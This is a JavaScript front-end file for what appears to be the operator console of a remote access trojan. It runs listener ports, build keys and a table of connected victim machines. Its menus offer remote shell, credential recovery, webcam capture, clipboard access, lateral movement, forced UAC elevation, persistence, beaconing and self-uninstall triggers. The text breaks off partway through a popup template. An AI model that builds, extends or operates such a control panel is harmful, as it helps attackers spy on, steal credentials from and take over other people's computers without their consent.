// Disable default right-click context menu
document.addEventListener('contextmenu', (e) => {
  // Allow context menu only on table rows (for our custom context menu)
  if (!e.target.closest('tbody')) {
    e.preventDefault();
  }
});

// Global invoke function - will be set when Tauri is ready
let invoke = async () => { throw new Error('Tauri not initialized'); };

// Initialize application
document.addEventListener('DOMContentLoaded', async () => {
  // Disable autocomplete on all inputs
  document.querySelectorAll('input').forEach(input => input.setAttribute('autocomplete', 'off'));

  console.log('DOMContentLoaded fired');
  console.log('__TAURI__:', window.__TAURI__);

  // Tauri v2 API for window controls
  if (window.__TAURI__) {
    console.log('__TAURI__.core:', window.__TAURI__.core);
    console.log('__TAURI__.window:', window.__TAURI__.window);

    const { getCurrentWindow } = window.__TAURI__.window;
    invoke = window.__TAURI__.core.invoke;
    const appWindow = getCurrentWindow();

    console.log('invoke function:', invoke);
    console.log('appWindow:', appWindow);

    document.getElementById('titlebar-minimize')?.addEventListener('click', () => appWindow.minimize());
    document.getElementById('titlebar-maximize')?.addEventListener('click', () => appWindow.toggleMaximize());
    document.getElementById('titlebar-close')?.addEventListener('click', () => appWindow.close());

    // Initialize keys on startup
    console.log('Calling init_keys...');
    try {
      const keys = await invoke('init_keys');
      console.log('init_keys returned:', keys);
      if (keys) {
        setKeyValue('pub-key', keys.public_key);
        setKeyValue('priv-key', keys.private_key);
      }
    } catch (e) {
      console.error('Failed to initialize keys:', e);
    }

    // Load port statuses
    await refreshPortStatuses();

    // Initial client fetch
    await refreshClients();

    // Initialize logs and settings
    await initLogs();
    await loadSettings();

    // Setup client connection event listeners for sounds/notifications
    setupClientConnectionListeners();
  } else {
    console.error('Tauri not available! Running outside Tauri context?');
  }
});

// ============ Client Connection Events (Sounds/Notifications) ============

// Audio context for playing notification sounds
let audioContext = null;

function getAudioContext() {
  if (!audioContext) {
    audioContext = new (window.AudioContext || window.webkitAudioContext)();
  }
  return audioContext;
}

// Play a simple notification beep
function playNotificationSound(type) {
  try {
    const ctx = getAudioContext();
    const oscillator = ctx.createOscillator();
    const gainNode = ctx.createGain();

    oscillator.connect(gainNode);
    gainNode.connect(ctx.destination);

    if (type === 'connect') {
      // Rising tone for connect
      oscillator.frequency.setValueAtTime(400, ctx.currentTime);
      oscillator.frequency.linearRampToValueAtTime(800, ctx.currentTime + 0.15);
    } else {
      // Falling tone for disconnect
      oscillator.frequency.setValueAtTime(600, ctx.currentTime);
      oscillator.frequency.linearRampToValueAtTime(300, ctx.currentTime + 0.15);
    }

    gainNode.gain.setValueAtTime(0.3, ctx.currentTime);
    gainNode.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.2);

    oscillator.start(ctx.currentTime);
    oscillator.stop(ctx.currentTime + 0.2);
  } catch (e) {
    console.warn('Could not play notification sound:', e);
  }
}

// Show system notification using browser Notification API
async function showSystemNotification(title, body) {
  try {
    if (!('Notification' in window)) return;

    if (Notification.permission === 'granted') {
      new Notification(title, { body });
    } else if (Notification.permission !== 'denied') {
      const permission = await Notification.requestPermission();
      if (permission === 'granted') {
        new Notification(title, { body });
      }
    }
  } catch (e) {
    console.warn('Could not show notification:', e);
  }
}

// Setup listeners for client connection events
async function setupClientConnectionListeners() {
  if (!window.__TAURI__) return;

  const { listen } = window.__TAURI__.event;

  // Client connected event
  listen('client-connected', (event) => {
    const { uid, machine, playSound, showNotification } = event.payload;
    console.log('Client connected:', uid, machine);

    if (playSound) {
      playNotificationSound('connect');
    }

    if (showNotification) {
      showSystemNotification('Client Connected', `${machine} (${uid.substring(0, 8)}...) connected`);
    }

    // Refresh client list
    refreshClients();
  });

  // Client disconnected event
  listen('client-disconnected', (event) => {
    const { uid, machine, playSound, showNotification } = event.payload;
    console.log('Client disconnected:', uid, machine);

    if (playSound) {
      playNotificationSound('disconnect');
    }

    if (showNotification) {
      showSystemNotification('Client Disconnected', `${machine} (${uid.substring(0, 8)}...) disconnected`);
    }

    // Refresh client list
    refreshClients();
  });

  // Client updated event (for info changes)
  listen('client-updated', (event) => {
    // Refresh client list when client info changes
    refreshClients();
  });
}

// Refresh port statuses from backend
async function refreshPortStatuses() {
  try {
    const statuses = await invoke('get_port_statuses');
    const portList = document.getElementById('port-list');
    if (portList && statuses) {
      // Update connection counts for existing ports
      statuses.forEach(status => {
        const portItem = portList.querySelector(`[data-port="${status.port}"]`);
        if (portItem) {
          const connSpan = portItem.querySelector('.port-connections');
          if (connSpan) {
            connSpan.textContent = `${status.connections} connection${status.connections !== 1 ? 's' : ''}`;
          }
          const toggle = portItem.querySelector('input[type="checkbox"]');
          if (toggle) {
            toggle.checked = status.enabled;
          }
        }
      });
    }
  } catch (e) {
    console.error('Failed to get port statuses:', e);
  }
}

// Refresh port statuses every 2 seconds
setInterval(refreshPortStatuses, 2000);

// Background canvas animation
const canvas=document.getElementById('bg-canvas'),bgCtx=canvas.getContext('2d');
canvas.width=window.innerWidth;canvas.height=window.innerHeight;
let time=0;

// Background color presets: [r, g, b] base colors
const bgColorPresets = {
  blue: { base: [100, 180, 255], dark: [80, 160, 255], light: [120, 200, 255] },
  purple: { base: [180, 100, 255], dark: [160, 80, 255], light: [200, 120, 255] },
  green: { base: [100, 255, 150], dark: [80, 220, 130], light: [120, 255, 170] },
  red: { base: [255, 100, 120], dark: [220, 80, 100], light: [255, 130, 150] },
  orange: { base: [255, 160, 80], dark: [240, 140, 60], light: [255, 180, 100] },
  cyan: { base: [80, 220, 255], dark: [60, 200, 240], light: [100, 240, 255] },
  pink: { base: [255, 120, 200], dark: [240, 100, 180], light: [255, 150, 220] },
};

let currentBgColor = localStorage.getItem('bgColor') || 'blue';

// Get color for current frame (handles RGB flow mode)
function getBgColors() {
  if (currentBgColor === 'none') return null;
  if (currentBgColor === 'rgb') {
    // Slow RGB flow - cycles through hues
    const hue = (time * 20) % 360;
    const toRgb = (h, s, l) => {
      const c = (1 - Math.abs(2 * l - 1)) * s;
      const x = c * (1 - Math.abs((h / 60) % 2 - 1));
      const m = l - c / 2;
      let r, g, b;
      if (h < 60) { r = c; g = x; b = 0; }
      else if (h < 120) { r = x; g = c; b = 0; }
      else if (h < 180) { r = 0; g = c; b = x; }
      else if (h < 240) { r = 0; g = x; b = c; }
      else if (h < 300) { r = x; g = 0; b = c; }
      else { r = c; g = 0; b = x; }
      return [Math.round((r + m) * 255), Math.round((g + m) * 255), Math.round((b + m) * 255)];
    };
    const base = toRgb(hue, 0.7, 0.6);
    const dark = toRgb((hue + 10) % 360, 0.6, 0.5);
    const light = toRgb((hue - 10 + 360) % 360, 0.7, 0.7);
    return { base, dark, light };
  }
  return bgColorPresets[currentBgColor] || bgColorPresets.blue;
}

const anim=()=>{
bgCtx.clearRect(0,0,canvas.width,canvas.height);
time+=.0015;

const colors = getBgColors();
if (colors) {
  for(let i=0;i<5;i++){
  const gradient=bgCtx.createLinearGradient(0,0,0,canvas.height);
  const offset=Math.sin(time+i*.8)*50;
  const y1=canvas.height*.2+offset+i*canvas.height*.15;
  const waveHeight=canvas.height*.25;
  const [br, bg, bb] = colors.base;
  const [dr, dg, db] = colors.dark;
  const [lr, lg, lb] = colors.light;
  gradient.addColorStop(0,`rgba(${br},${bg},${bb},0)`);
  gradient.addColorStop(.3,`rgba(${dr},${dg},${db},${.08+Math.sin(time+i)*.03})`);
  gradient.addColorStop(.5,`rgba(${br},${bg},${bb},${.15+Math.sin(time+i*.7)*.05})`);
  gradient.addColorStop(.7,`rgba(${lr},${lg},${lb},${.08+Math.sin(time+i)*.03})`);
  gradient.addColorStop(1,`rgba(${br},${bg},${bb},0)`);
  bgCtx.fillStyle=gradient;
  bgCtx.beginPath();
  for(let x=0;x<=canvas.width;x+=5){
  const wave1=Math.sin(x*.005+time+i)*30;
  const wave2=Math.sin(x*.003+time*1.3+i*.5)*20;
  const y=y1+wave1+wave2;
  if(x===0)bgCtx.moveTo(x,y);
  else bgCtx.lineTo(x,y);
  }
  for(let x=canvas.width;x>=0;x-=5){
  const wave1=Math.sin(x*.005+time+i)*30;
  const wave2=Math.sin(x*.003+time*1.3+i*.5)*20;
  const y=y1+wave1+wave2+waveHeight;
  bgCtx.lineTo(x,y);
  }
  bgCtx.closePath();
  bgCtx.fill();
  }
}
requestAnimationFrame(anim);
};anim();
window.onresize=()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight};

// Background color selector - initialization only (click handling done by generic select-wrapper handler)
(function initBgColorSelector() {
  const bgColorWrapper = document.getElementById('bg-color-wrapper');
  const bgColorSelect = document.getElementById('bg-color-select');
  const bgColorOptions = document.getElementById('bg-color-options');

  if (bgColorWrapper && bgColorSelect && bgColorOptions) {
    // Set initial value from localStorage
    const savedColor = localStorage.getItem('bgColor') || 'blue';
    const savedOption = bgColorOptions.querySelector(`[data-value="${savedColor}"]`);
    if (savedOption) {
      bgColorSelect.textContent = savedOption.textContent;
      bgColorOptions.querySelectorAll('.custom-option').forEach(o => o.classList.remove('selected'));
      savedOption.classList.add('selected');
    }
  }
})();
// Key display state - stores full keys but displays truncated
const keyData = { 'pub-key': '', 'priv-key': '' };

const toggleKey = (id) => {
  const textarea = document.getElementById(id);
  const icon = document.querySelector(`.toggle-key[data-target="${id}"]`);

  if (textarea.classList.contains('expanded')) {
    // Collapse - show truncated
    textarea.classList.remove('expanded');
    textarea.style.height = '38px';
    textarea.value = truncateKey(keyData[id]);
    icon?.classList.remove('active');
  } else {
    // Expand - show full key
    textarea.classList.add('expanded');
    textarea.value = keyData[id];
    // Calculate height needed for content
    textarea.style.height = 'auto';
    const scrollHeight = textarea.scrollHeight;
    textarea.style.height = '38px';
    // Force reflow then animate to full height
    requestAnimationFrame(() => {
      textarea.style.height = scrollHeight + 'px';
    });
    icon?.classList.add('active');
  }
};

const copyKey = (id) => {
  // Copy the full key, not the truncated display
  navigator.clipboard.writeText(keyData[id]).then(() => {
    const icon = document.querySelector(`.copy-key[data-target="${id}"]`);
    icon?.classList.add('active');
    setTimeout(() => icon?.classList.remove('active'), 1000);
  });
};

const truncateKey = (key) => {
  if (!key || key.length <= 40) return key;
  return key.substring(0, 20) + '...' + key.substring(key.length - 16);
};

const setKeyValue = (id, value) => {
  keyData[id] = value;
  const textarea = document.getElementById(id);
  if (textarea && !textarea.classList.contains('expanded')) {
    textarea.value = truncateKey(value);
  } else if (textarea) {
    textarea.value = value;
  }
};

// Bind key toggle/copy event listeners
document.querySelectorAll('.toggle-key').forEach(icon => {
  icon.addEventListener('click', () => toggleKey(icon.dataset.target));
});
document.querySelectorAll('.copy-key').forEach(icon => {
  icon.addEventListener('click', () => copyKey(icon.dataset.target));
});
const tbody=document.getElementById('tbody'),ctxMenu=document.getElementById('ctx');

// Position a context menu with flip logic to keep it within viewport
function positionContextMenu(menu, clickX, clickY) {
  // Reset position first to measure true size
  menu.style.left = '0px';
  menu.style.top = '0px';
  menu.classList.add('show');

  const menuRect = menu.getBoundingClientRect();
  const menuWidth = menuRect.width;
  const menuHeight = menuRect.height;
  const viewportWidth = window.innerWidth;
  const viewportHeight = window.innerHeight;

  let left = clickX;
  let top = clickY;

  // Flip left if would overflow right edge
  if (clickX + menuWidth > viewportWidth - 10) {
    left = clickX - menuWidth;
  }

  // Flip up if would overflow bottom edge
  if (clickY + menuHeight > viewportHeight - 10) {
    top = clickY - menuHeight;
  }

  // Ensure menu doesn't go off left/top edges
  if (left < 10) left = 10;
  if (top < 10) top = 10;

  menu.style.left = left + 'px';
  menu.style.top = top + 'px';
}
let sel=null,selected=new Set(),sortCol=null,sortDir=1;
let clients=[];

// Fetch clients from backend
async function refreshClients() {
  try {
    const newClients = await invoke('get_clients');
    clients = newClients.map(c => ({
      uid: c.uid,
      ip: c.ip,
      geo: c.geo || 'Unknown',
      machine: c.machine,
      user: c.user,
      os: c.os,
      arch: c.arch,
      build: c.build,
      status: c.status,
      connected: Date.now() - c.connected, // Convert to timestamp
      ping: c.ping,
      account: c.account,
      uptime: c.uptime,
      window: c.window || '-',
      cpu: c.cpu,
      ram: c.ram,
    }));
    render();
  } catch (e) {
    console.error('Failed to fetch clients:', e);
  }
}
const fmt=ms=>{const s=Math.floor(ms/1000),m=Math.floor(s/60),h=Math.floor(m/60),d=Math.floor(h/24);return d>0?`${d}d ${h%24}h`:h>0?`${h}h ${m%60}m`:`${m}m ${s%60}s`};
const getPingClass=p=>p<100?'good':p<200?'warn':'high';
const render=(isNew=false)=>{
let filtered=clients;
if(sortCol)filtered.sort((a,b)=>{let av=a[sortCol],bv=b[sortCol];if(sortCol==='connected')return(av-bv)*sortDir;if(typeof av==='number')return(av-bv)*sortDir;return String(av).localeCompare(String(bv))*sortDir});
const existing=Array.from(tbody.querySelectorAll('tr')).reduce((m,tr)=>{m.set(tr.dataset.uid,tr);return m},new Map());
const frag=document.createDocumentFragment();
filtered.forEach((c,i)=>{
let tr=existing.get(c.uid);
if(tr){
const pingSpan=tr.querySelector('.ping-val');
if(pingSpan)pingSpan.textContent=`(${c.ping}ms)`;
}else{
tr=document.createElement('tr');
const identity = `${c.user}@${c.machine}`;
const ipText = `${c.ip} (${c.ping}ms)`;
tr.innerHTML=`<td class="truncate-cell" data-tooltip="${identity}">${identity}</td><td class="truncate-cell" data-tooltip="${ipText}">${c.ip} <span class="time ping-val">(${c.ping}ms)</span></td><td class="truncate-cell" data-tooltip="${c.geo}">${c.geo}</td><td class="truncate-cell" data-tooltip="${c.os}">${c.os}</td><td class="truncate-cell" data-tooltip="${c.arch}">${c.arch}</td><td class="truncate-cell" data-tooltip="${c.account}">${c.account}</td><td class="truncate-cell" data-tooltip="${c.uptime}">${c.uptime}</td><td class="truncate-cell" data-tooltip="${c.window || '-'}">${c.window || '-'}</td><td class="truncate-cell" data-tooltip="${c.cpu}% / ${c.ram}%">${c.cpu}% / ${c.ram}%</td><td class="truncate-cell" data-tooltip="${c.build}">${c.build}</td>`;
tr.dataset.uid=c.uid;
tr.onclick=e=>{
if(e.ctrlKey||e.metaKey){if(selected.has(c.uid)){selected.delete(c.uid);tr.classList.remove('selected')}else{selected.add(c.uid);tr.classList.add('selected')}}
else{if(tr.classList.contains('active')){tr.classList.remove('active');sel=null}else{document.querySelectorAll('tr.active').forEach(r=>r.classList.remove('active'));tr.classList.add('active');sel=c}}
};
tr.oncontextmenu=e=>{e.preventDefault();document.querySelectorAll('tr.active').forEach(r=>r.classList.remove('active'));tr.classList.add('active');sel=c;ctxMenu.classList.remove('show');setTimeout(()=>positionContextMenu(ctxMenu,e.clientX,e.clientY),10)};
}
frag.appendChild(tr);
});
tbody.innerHTML='';
tbody.appendChild(frag);
};
document.querySelectorAll('th[data-col]').forEach(th=>{th.onclick=()=>{const col=th.dataset.col;if(sortCol===col)sortDir*=-1;else{sortCol=col;sortDir=1}document.querySelectorAll('th').forEach(h=>h.className='');th.className=sortDir===1?'sort-asc':'sort-desc';render()}});
document.onclick=e=>{
ctxMenu.classList.remove('show');
if(!e.target.closest('tbody')){document.querySelectorAll('tr.selected').forEach(r=>r.classList.remove('selected'));selected.clear()}
};
ctxMenu.onclick=e=>{
  e.stopPropagation();
  const act=e.target.dataset.action;
  if(!act||!sel)return;
  ctxMenu.classList.remove('show');
  showPopup(act, sel);
};
ctxMenu.onmouseleave=()=>{ctxMenu.classList.remove('show')};
document.addEventListener('keydown',e=>{
const rows=Array.from(tbody.querySelectorAll('tr'));
const active=rows.findIndex(r=>r.classList.contains('active'));
if(e.key==='ArrowDown'&&active<rows.length-1){e.preventDefault();rows[active]?.classList.remove('active');rows[active+1].classList.add('active');sel=clients.find(c=>c.uid===rows[active+1].dataset.uid);rows[active+1].scrollIntoView({block:'nearest'})}
if(e.key==='ArrowUp'&&active>0){e.preventDefault();rows[active]?.classList.remove('active');rows[active-1].classList.add('active');sel=clients.find(c=>c.uid===rows[active-1].dataset.uid);rows[active-1].scrollIntoView({block:'nearest'})}
if(e.key==='Enter'&&sel)console.log('shell',sel.uid);
if(e.key==='Delete'&&sel)console.log('disconnect',sel.uid);
if(e.key==='Escape'){document.querySelectorAll('tr.active').forEach(r=>r.classList.remove('active'));sel=null;selected.clear();render()}
});
document.querySelectorAll('.nav-item').forEach(nav=>{nav.onclick=()=>{document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));nav.classList.add('active');document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));document.getElementById(nav.dataset.tab+'-tab').classList.add('active')}});

// Custom dropdown handling - using event delegation for dynamically created dropdowns
document.addEventListener('click', (e) => {
  // Handle custom-select click (toggle dropdown)
  const selectBtn = e.target.closest('.custom-select');
  if (selectBtn) {
    e.stopPropagation();
    const wrapper = selectBtn.closest('.select-wrapper');
    if (wrapper) {
      // Close other dropdowns
      document.querySelectorAll('.select-wrapper').forEach(w => {
        if (w !== wrapper) w.classList.remove('open');
      });
      // Toggle current
      wrapper.classList.toggle('open');
    }
    return;
  }

  // Handle custom-option click (select option)
  const option = e.target.closest('.custom-option');
  if (option) {
    e.stopPropagation();
    const wrapper = option.closest('.select-wrapper');
    if (wrapper) {
      const selectBtn = wrapper.querySelector('.custom-select');
      const options = wrapper.querySelectorAll('.custom-option');
      const value = option.dataset.value;

      // Update selected state
      options.forEach(opt => opt.classList.remove('selected'));
      option.classList.add('selected');

      // Update button text (use textContent for display, value for data)
      selectBtn.textContent = option.textContent;
      selectBtn.dataset.value = value;

      // Close dropdown
      wrapper.classList.remove('open');

      // Handle background color change
      if (wrapper.id === 'bg-color-wrapper') {
        currentBgColor = value;
        localStorage.setItem('bgColor', value);
      }
    }
    return;
  }

  // Close all dropdowns when clicking outside
  if (!e.target.closest('.select-wrapper')) {
    document.querySelectorAll('.select-wrapper').forEach(w => w.classList.remove('open'));
  }
});

document.querySelectorAll('input[name="autorun"]').forEach(radio=>{radio.onchange=()=>{const label=document.getElementById('autorun-label');const text=document.getElementById('autorun-text');if(document.getElementById('ps-radio').checked){label.textContent='Autorun PowerShell';text.placeholder='Get-Process | Where-Object {$_.CPU -gt 100}'}else{label.textContent='Autorun Commands';text.placeholder='whoami\nhostname\nipconfig'}}});

// Protocol radio buttons
document.querySelectorAll('input[name="protocol"]').forEach(radio => {
  radio.onchange = () => {
    const beaconConfig = document.getElementById('beacon-config');
    if (document.getElementById('beacon-radio').checked) {
      beaconConfig.classList.add('show');
    } else {
      beaconConfig.classList.remove('show');
    }
  };
});

// Trigger type handling - needs to wait for dropdowns to be initialized
setTimeout(() => {
  const triggerWrapper = document.querySelector('[data-name="uninstall-trigger"]');
  if (triggerWrapper) {
    const options = triggerWrapper.querySelectorAll('.custom-option');
    options.forEach(option => {
      option.addEventListener('click', () => {
        const value = option.dataset.value;
        
        // Hide all trigger configs
        document.getElementById('trigger-time').classList.remove('show');
        document.getElementById('trigger-nocontact').classList.remove('show');
        document.getElementById('trigger-user').classList.remove('show');
        document.getElementById('trigger-hostname').classList.remove('show');
        
        // Show relevant config with delay for animation
        setTimeout(() => {
          if (value === 'Time/Date') {
            document.getElementById('trigger-time').classList.add('show');
          } else if (value === 'No server contact') {
            document.getElementById('trigger-nocontact').classList.add('show');
          } else if (value === 'Specific User') {
            document.getElementById('trigger-user').classList.add('show');
          } else if (value === 'Specific Hostname') {
            document.getElementById('trigger-hostname').classList.add('show');
          }
        }, 50);
      });
    });
  }
}, 100);

// Show confirmation dialog for stopping a port with active connections
const showStopPortConfirmation = (port, connectionCount) => {
  return new Promise((resolve) => {
    popupTitle.textContent = 'Stop Listener';
    popupContent.innerHTML = `
      <p style="color:#d0d0d0;margin-bottom:16px;">Port <strong>${port}</strong> has <strong>${connectionCount}</strong> active connection${connectionCount !== 1 ? 's' : ''}. Stopping this listener will disconnect ${connectionCount === 1 ? 'this client' : 'these clients'}.</p>
      <p style="color:#888;font-size:12px;margin-bottom:16px;">Are you sure you want to stop this listener?</p>
      <div style="display:flex;gap:8px;">
        <button class="popup-btn" id="confirm-stop-port" style="flex:1;">Stop Listener</button>
        <button class="popup-btn" id="cancel-stop-port" style="flex:1;background:rgba(255,255,255,.1);border-color:rgba(255,255,255,.2);color:#888;">Cancel</button>
      </div>
    `;
    popupOverlay.classList.add('show');

    document.getElementById('confirm-stop-port')?.addEventListener('click', () => {
      popupOverlay.classList.remove('show');
      resolve(true);
    });

    document.getElementById('cancel-stop-port')?.addEventListener('click', () => {
      popupOverlay.classList.remove('show');
      resolve(false);
    });

    // Also handle clicking outside or pressing X
    const handleClose = () => {
      popupOverlay.classList.remove('show');
      resolve(false);
    };
    popupClose.addEventListener('click', handleClose, { once: true });
  });
};

// Helper function to stop a port listener with confirmation if there are active connections
const stopPortWithConfirmation = async (port, toggle) => {
  // Get current connection count for this port
  const portItem = document.querySelector(`.port-item[data-port="${port}"]`);
  const connSpan = portItem?.querySelector('.port-connections');
  const connText = connSpan?.textContent || '0 connections';
  const connectionCount = parseInt(connText) || 0;

  if (connectionCount > 0) {
    const confirmed = await showStopPortConfirmation(port, connectionCount);
    if (!confirmed) {
      // User cancelled - revert the toggle
      if (toggle) toggle.checked = true;
      return false;
    }
  }

  // Proceed with stopping the listener
  try {
    await invoke('stop_listener', { port });
    return true;
  } catch (err) {
    console.error('Failed to stop listener:', err);
    if (toggle) toggle.checked = true; // Revert on error
    return false;
  }
};

const addPort=async ()=>{
  const inp=document.getElementById('port-input'),val=inp.value;
  if(val){
    const port = parseInt(val);
    if (isNaN(port) || port < 1 || port > 65535) {
      inp.value='';
      return;
    }
    // Check for duplicate port
    const existing = document.querySelector(`.port-item[data-port="${port}"]`);
    if(existing){
      inp.value='';
      return;
    }

    // Add port to backend
    try {
      await invoke('add_port', { port });
    } catch (e) {
      console.error('Failed to add port:', e);
      inp.value='';
      return;
    }

    const item=document.createElement('div');
    item.className='port-item';
    item.dataset.port=port;
    item.innerHTML=`<label class="toggle small"><input type="checkbox"><div class="switch"></div></label><span class="port-number">${port}</span><span class="port-connections">0 connections</span><span class="remove">✕</span>`;

    // Add toggle listener for starting/stopping listener
    const toggle = item.querySelector('input[type="checkbox"]');
    toggle.addEventListener('change', async (e) => {
      if (e.target.checked) {
        try {
          await invoke('start_listener', { port });
        } catch (err) {
          console.error('Failed to start listener:', err);
          e.target.checked = false; // Revert on error
        }
      } else {
        await stopPortWithConfirmation(port, e.target);
      }
    });

    // Add remove listener
    const removeBtn = item.querySelector('.remove');
    removeBtn.addEventListener('click', async () => {
      // Check for active connections before removing
      const connSpan = item.querySelector('.port-connections');
      const connText = connSpan?.textContent || '0 connections';
      const connectionCount = parseInt(connText) || 0;

      if (connectionCount > 0) {
        const confirmed = await showStopPortConfirmation(port, connectionCount);
        if (!confirmed) return;
      }

      try {
        await invoke('remove_port', { port });
        item.remove();
      } catch (err) {
        console.error('Failed to remove port:', err);
      }
    });

    document.getElementById('port-list').appendChild(item);
    inp.value='';
  }
};

// Initialize existing port toggles
document.querySelectorAll('.port-item').forEach(item => {
  const port = parseInt(item.dataset.port);
  const toggle = item.querySelector('input[type="checkbox"]');
  const removeBtn = item.querySelector('.remove');

  if (toggle) {
    toggle.addEventListener('change', async (e) => {
      if (e.target.checked) {
        try {
          await invoke('start_listener', { port });
        } catch (err) {
          console.error('Failed to start listener:', err);
          e.target.checked = false; // Revert on error
        }
      } else {
        await stopPortWithConfirmation(port, e.target);
      }
    });
  }

  if (removeBtn) {
    removeBtn.onclick = null; // Remove inline handler
    removeBtn.addEventListener('click', async () => {
      // Check for active connections before removing
      const connSpan = item.querySelector('.port-connections');
      const connText = connSpan?.textContent || '0 connections';
      const connectionCount = parseInt(connText) || 0;

      if (connectionCount > 0) {
        const confirmed = await showStopPortConfirmation(port, connectionCount);
        if (!confirmed) return;
      }

      try {
        await invoke('remove_port', { port });
        item.remove();
      } catch (err) {
        console.error('Failed to remove port:', err);
      }
    });
  }
});

// Advanced settings expandable toggle
document.getElementById('advanced-toggle')?.addEventListener('click', () => {
  document.getElementById('advanced-section')?.classList.toggle('open');
});

// Request elevation toggle - show/hide elevation method
document.getElementById('request-elevation')?.addEventListener('change', (e) => {
  const field = document.getElementById('elevation-method-field');
  if (e.target.checked) {
    field?.classList.add('show');
  } else {
    field?.classList.remove('show');
  }
});

// Run on startup toggle - show/hide persistence method
document.getElementById('run-on-startup')?.addEventListener('change', (e) => {
  const field = document.getElementById('persistence-field');
  if (e.target.checked) {
    field?.classList.add('show');
  } else {
    field?.classList.remove('show');
  }
});

// DNS mode toggle
document.getElementById('dns-system')?.addEventListener('change', () => {
  document.getElementById('custom-dns-fields')?.classList.remove('show');
});
document.getElementById('dns-custom')?.addEventListener('change', () => {
  document.getElementById('custom-dns-fields')?.classList.add('show');
});

// Disclosure dialog toggle
document.getElementById('show-disclosure')?.addEventListener('change', (e) => {
  const fields = document.getElementById('disclosure-fields');
  if (e.target.checked) {
    fields?.classList.add('show');
  } else {
    fields?.classList.remove('show');
  }
});

// Proxy toggle - show/hide proxy fields
document.getElementById('use-proxy')?.addEventListener('change', (e) => {
  const fields = document.getElementById('proxy-fields');
  if (e.target.checked) {
    fields?.classList.add('show');
  } else {
    fields?.classList.remove('show');
  }
});

// WebSocket toggle - show/hide websocket path field
document.getElementById('websocket-mode')?.addEventListener('change', (e) => {
  const fields = document.getElementById('websocket-fields');
  if (e.target.checked) {
    fields?.classList.add('show');
  } else {
    fields?.classList.remove('show');
  }
});

// Regenerate keys with confirmation
document.getElementById('regenerate-keys-btn')?.addEventListener('click', async () => {
  if (confirm('WARNING: Regenerating cryptographic keys will invalidate all existing clients. All connected clients will need to be rebuilt with the new keys. Do you want to continue?')) {
    try {
      const keys = await invoke('regenerate_keys');
      if (keys) {
        setKeyValue('pub-key', keys.public_key);
        setKeyValue('priv-key', keys.private_key);
        // Collapse if expanded
        document.getElementById('pub-key')?.classList.remove('expanded');
        document.getElementById('priv-key')?.classList.remove('expanded');
        document.querySelector('.toggle-key[data-target="pub-key"]')?.classList.remove('active');
        document.querySelector('.toggle-key[data-target="priv-key"]')?.classList.remove('active');
      }
    } catch (e) {
      console.error('Failed to regenerate keys:', e);
      alert('Failed to regenerate keys: ' + e);
    }
  }
});

// Popup window system
const popupOverlay = document.getElementById('popup-overlay');
const popupTitle = document.getElementById('popup-title');
const popupContent = document.getElementById('popup-content');
const popupClose = document.getElementById('popup-close');

const showPopup = (action, client) => {
  // Intercept remote-shell to use the xterm.js terminal instead of popup
  if (action === 'remote-shell') {
    openTerminal(client);
    return;
  }

  // Intercept file-manager to use the file manager overlay
  if (action === 'file-manager') {
    openFileManager(client);
    return;
  }

  // Intercept registry-editor to use the registry manager overlay
  if (action === 'registry-editor') {
    openRegistryManager(client);
    return;
  }

  // Intercept process-manager to use the process manager overlay
  if (action === 'process-manager') {
    openProcessManager(client);
    return;
  }

  // Intercept startup-manager to use the startup manager overlay
  if (action === 'startup-manager') {
    openStartupManager(client);
    return;
  }

  // Intercept tcp-connections to use the TCP connections overlay
  if (action === 'tcp-connections') {
    openTcpConnections(client);
    return;
  }

  // Intercept services-manager to use the services manager overlay
  if (action === 'services-manager') {
    openServicesManager(client);
    return;
  }

  // Intercept task-scheduler to use the task scheduler overlay
  if (action === 'task-scheduler') {
    openTaskScheduler(client);
    return;
  }

  // Intercept wmi-console to use the WMI console overlay
  if (action === 'wmi-console') {
    openWmiConsole(client);
    return;
  }

  // Intercept dns-cache to use the DNS cache overlay
  if (action === 'dns-cache') {
    openDnsCache(client);
    return;
  }

  // Intercept chat to use the chat overlay
  if (action === 'chat') {
    openChatWindow(client);
    return;
  }

  popupTitle.textContent = getActionTitle(action);
  popupContent.innerHTML = getActionContent(action, client);

  // Apply wide class for certain popups
  const popupWindow = popupOverlay.querySelector('.popup-window');
  popupWindow.classList.remove('wide', 'extra-wide');
  if (action === 'lateral-movement') {
    popupWindow.classList.add('extra-wide');
  }

  popupOverlay.classList.add('show');

  // Bind any buttons in the popup
  bindPopupActions(action, client);
};

// Global cleanup callback for active popup (set by webcam, etc.)
let popupCleanupCallback = null;

const closePopup = async () => {
  // Run cleanup if set
  if (popupCleanupCallback) {
    await popupCleanupCallback();
    popupCleanupCallback = null;
  }
  popupOverlay.classList.remove('show');
  // Clean up any size modifiers
  const popupWindow = popupOverlay.querySelector('.popup-window');
  popupWindow?.classList.remove('wide', 'extra-wide');
};

const getActionTitle = (action) => {
  const titles = {
    // Administration
    'remote-shell': 'Remote Shell',
    'remote-execute': 'Remote Execute',
    'file-manager': 'File Manager',
    'registry-editor': 'Registry Editor',
    'process-manager': 'Process Manager',
    'tcp-connections': 'TCP Connections',
    'startup-manager': 'Startup Manager',
    'services-manager': 'Services Manager',
    'system-info': 'System Information',
    // Surveillance
    'remote-desktop': 'Remote Desktop',
    'screenshot': 'Screenshot',
    'webcam': 'Webcam Capture',
    'clipboard': 'Clipboard Manager',
    // User Interaction
    'messagebox': 'Show Messagebox',
    'open-url': 'Open URL',
    'chat': 'Chat with User',
    // Recovery
    'credentials': 'Credential Recovery',
    // Network
    'reverse-proxy': 'Reverse Proxy',
    'dns-management': 'Hosts Management',
    'lateral-movement': 'Lateral Movement',
    // Client Control
    'elevate': 'Request UAC',
    'force-elevate': 'Force UAC',
    'update': 'Update Client',
    'reconnect': 'Reconnect Client',
    'disconnect': 'Disconnect Client',
    'uninstall': 'Uninstall Client',
    'restart-client': 'Restart Client',
    // System
    'reboot': 'Reboot System',
    'shutdown': 'Shutdown System',
    'lock': 'Lock Workstation',
    'logoff': 'Log Off User',
  };
  return titles[action] || 'Action';
};

const getActionContent = (action, client) => {
  switch(action) {
    // Monitoring - System Info
    case 'system-info':
      return `
        <div class="info-grid">
          <div class="info-label">UID:</div>
          <div class="info-value">${client.uid}</div>
          <div class="info-label">IP Address:</div>
          <div class="info-value">${client.ip}</div>
          <div class="info-label">Ping:</div>
          <div class="info-value">${client.ping}ms</div>
          <div class="info-label">GeoLocation:</div>
          <div class="info-value">${client.geo}</div>
